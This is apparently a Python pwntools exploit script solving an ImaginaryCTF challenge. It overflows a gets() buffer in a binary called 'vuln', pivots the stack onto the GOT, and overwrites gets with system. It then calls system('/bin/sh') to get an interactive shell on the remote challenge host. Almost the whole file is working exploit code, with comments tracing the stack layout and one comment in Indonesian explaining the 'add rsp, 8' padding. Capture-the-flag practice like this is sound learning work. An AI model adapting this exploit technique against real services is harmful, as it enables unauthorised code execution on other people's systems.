#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './vuln'
elf = context.binary = ELF(exe, checksec=True)
# libc = '/lib/x86_64-linux-gnu/libc.so.6'
# libc = ELF(libc, checksec=False)
context.log_level = 'debug'
host, port = 'ret2win.chal.imaginaryctf.org', 1337

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *main+12
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
io = initialize()
rop = ROP(exe)

# instructions at 0x401162
# lea rax,[rbp-0x40]  
# mov rdi,rax
# mov eax,0x0
# call gets@plt

offset = 64 + 8

# overwrite got puts to system
payload = flat({
    offset: [
        rop.rbp.address,
        elf.got['gets'] + 0x40,
        rop.ret.address,
        0x401162                # lea rax,[rbp-0x40], mov rdi,rax 
    ]
})
io.sendline(payload)

# Stack after first payload
# GOT gets at 0x404020 + 0x0 = elf.plt['system']
#             0x404020 + 0x8 = /bin/sh\x00  
#             0x404020 + 0x10 -- 0x38 = cyclic(0x30)       
#             0x404020 + 0x40 = 0x404020+0x40+0x8    -> [RBP]
#             0x404020 + 0x48 = ret

# Stack then after leave instruction in main
# GOT gets at 0x404020 + 0x0 = elf.plt['system']
#             0x404020 + 0x8 = /bin/sh\x00  
#             0x404020 + 0x10 -- 0x38 = cyclic(0x30)        
#             0x404020 + 0x40 = 0x404028+0x40+0x8    -> RBP
#             0x404020 + 0x48 = ret                  -> RSP

# ret instruction in main then will pop rip thus
# inserting 0x404020 + 0x48 instruction to rip

# Stack then after ret instruction in main
# GOT gets at 0x404020 + 0x0 = elf.plt['system']
#             0x404020 + 0x8 = /bin/sh\x00  
#             0x404020 + 0x10 -- 0x38 = cyclic(0x30)       
#             0x404020 + 0x40 = 0x404028+0x40+0x8    -> RBP
#             0x404020 + 0x48 = ret                  
#             0x404020 + 0x50 = add rsp, 8           -> RSP
#                           [...]
#                            ret
#              lea rax,[rbp-0x40], mov rdi,rax 

# addressing the add rsp, 8:
# iya cuma ngurangin stack frame aja, soalnya pas call posix_spawn() 
# argsnya masih kebanyakan di stack, jadinya pas call system tu bukanya 
# system("/bin/sh") malah system("<random stack pointer>"). 
# Nah itu 400 biar aman aja
# @hyffs on TCP1P discord

# payload for the next gets()
payload = flat(
    elf.plt['system'],
    b'/bin/sh\x00',
    cyclic(0x30),           # padding to fill, so next value is a pointer to /bin/sh because that's where RBP is
    0x404020 + 0x40 + 0x8,
    rop.ret.address,
    p64(0x401016) * 400,    # add rsp, 8; ret;
    rop.ret.address,
    0x401162                # lea rax,[rbp-0x40], mov rdi,rax 
)

io.sendline(payload)
io.interactive()